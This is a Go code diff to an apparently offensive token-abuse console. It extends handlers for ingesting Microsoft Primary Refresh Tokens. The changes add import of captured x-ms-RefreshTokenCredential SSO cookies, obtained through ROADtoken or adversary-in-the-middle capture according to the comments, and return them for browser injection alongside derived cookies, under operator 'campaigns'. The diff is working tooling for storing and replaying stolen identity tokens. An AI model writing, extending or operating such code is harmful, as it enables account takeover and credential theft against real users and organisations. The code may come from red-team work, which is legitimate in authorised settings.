@@ -3813,11 +3813,12 @@ func (h *Handler) deletePRT(w http.ResponseWriter, r *http.Request) {
 }
 
 // prtIngest is the same-origin, operator-authenticated equivalent of a PRT drop
-// to the token listener's /token endpoint. It lets the console UI store a PRT
-// (and optionally auto-exchange it into a campaign) without a cross-origin call
-// to the listener's port. Body fields match the listener PRT payload:
-// prt/prt_token, session_key, upn, tenant_id, device_cert_id, label, campaign_id,
-// client_id, resource.
+// to the token listener's /token endpoint. It lets the console UI store a PRT (and
+// optionally auto-exchange it into a campaign), or import a captured PRT SSO
+// cookie, without a cross-origin call to the listener's port. Body fields match
+// the listener PRT payload: prt/prt_token, session_key, upn, tenant_id,
+// device_cert_id, label, campaign_id, client_id, resource — or prt_cookie /
+// the ROADtoken `response` array for a cookie-only capture.
 func (h *Handler) prtIngest(w http.ResponseWriter, r *http.Request) {
 	body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
 	var in tokenIntake
@@ -3825,8 +3826,14 @@ func (h *Handler) prtIngest(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 400, "invalid JSON body")
 		return
 	}
+	// A cookie-only capture (x-ms-RefreshTokenCredential, no raw PRT) is stored as
+	// a browser-injection artifact; there is nothing to auto-exchange.
+	if in.isPRTCookie() && !in.isPRT() {
+		h.TokenListener.ingestPRTCookie(w, r, in)
+		return
+	}
 	if !in.isPRT() {
-		writeError(w, 400, "prt (or prt_token) required")
+		writeError(w, 400, "prt, prt_token, or prt_cookie (x-ms-RefreshTokenCredential) required")
 		return
 	}
 	campaignID := in.CampaignID
@@ -3918,13 +3925,20 @@ func (h *Handler) prtToCookie(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 404, "PRT not found")
 		return
 	}
+	// Cookie-only import: the x-ms-RefreshTokenCredential was captured directly
+	// (ROADtoken/AiTM) — return it as-is for browser injection. There is no session
+	// key to derive a fresh cookie from.
+	if row.PRTCookie != "" {
+		json.NewEncoder(w).Encode(map[string]string{"cookie": row.PRTCookie, "name": "x-ms-RefreshTokenCredential", "source": "captured"})
+		return
+	}
 	p := &prtpkg.PRT{Token: row.PRTToken, SessionKey: row.SessionKey}
 	cookie, err := prtpkg.ToCookie(context.Background(), p)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
 	}
-	json.NewEncoder(w).Encode(map[string]string{"cookie": cookie, "name": "x-ms-RefreshTokenCredential"})
+	json.NewEncoder(w).Encode(map[string]string{"cookie": cookie, "name": "x-ms-RefreshTokenCredential", "source": "derived"})
 }
 
 // ─── WinHello Keys ────────────────────────────────────────────────────────────
